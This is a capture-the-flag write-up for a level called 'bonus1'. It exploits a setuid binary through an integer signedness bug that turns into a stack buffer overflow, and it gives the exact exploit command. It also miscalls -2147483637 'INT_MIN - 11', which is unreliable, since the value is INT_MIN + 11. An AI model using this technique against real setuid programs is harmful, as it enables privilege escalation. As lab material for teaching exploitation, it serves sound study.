# bonus1

## Solution
 * There is one file in our home, ```bonus1```, belonging to ```bonus2``` user, with suid.
 * Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

## Explanation
Keeping only the parts which matters:
 * Our stack looks this way ```c
	 char		buf[40];
	 int32_t		val;
 ```

 * The program starts with `val = atoi(av[1])`
 * If `(val < 10)` the program continue his execution
 * It then does a read on it : `memcpy(buf, av[2], val * 4)`
 	* We would like to make a buffer overflow here, but we need `(val == 11)`
 * Finally if `(val == 0x574f4c46)` we get access to `execl`

## Execution
To have a long enough size for `memcpy` we can abuse the fact that the 1st comparison `(val < 10)` is signed while the `3rd argument of memcpy()` is unsigned:

We can launch the program this way:
```sh
./bonus1 -2147483637 `python -c "print('?' * 40 + '464c4f57'.decode('hex'))"`
```

We have chosen `-2147483637` as it is equal to `INT_MIN - 11`.
Allowing us to complete this bonus.
